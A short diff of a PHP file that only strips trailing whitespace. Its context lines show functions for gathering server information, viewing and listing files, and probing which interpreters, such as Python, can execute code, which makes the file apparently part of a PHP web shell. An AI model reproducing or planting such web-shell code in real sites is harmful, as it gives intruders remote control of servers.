@@ -55,7 +55,7 @@ if(!function_exists('get_server_info')){
 		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
 		$server_info['uname'] = php_uname();
 		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":'';
-		$server_info['software'] = $server_software."  PHP ".phpversion();		
+		$server_info['software'] = $server_software."  PHP ".phpversion();
 		return $server_info;
 	}
 }
@@ -529,8 +529,8 @@ if(!function_exists('view_file')){
 							"hl_html"=> ini_get('highlight.html'),
 							"hl_comment"=> ini_get('highlight.comment')
 							);
-				
-				
+
+
 				$content = highlight_string(read_file($file),true);
 				foreach($hl_arr as $k=>$v){
 					$content = str_replace("<font color=\"".$v."\">", "<font class='".$k."'>", $content);
@@ -766,7 +766,7 @@ if(!function_exists('show_all_files')){
 if(!function_exists('eval_get_supported')){
 	function eval_get_supported(){
 		$eval_supported = array();
-		
+
 		$eval_supported[] = "php";
 
 		$check = strtolower(execute("python -h"));
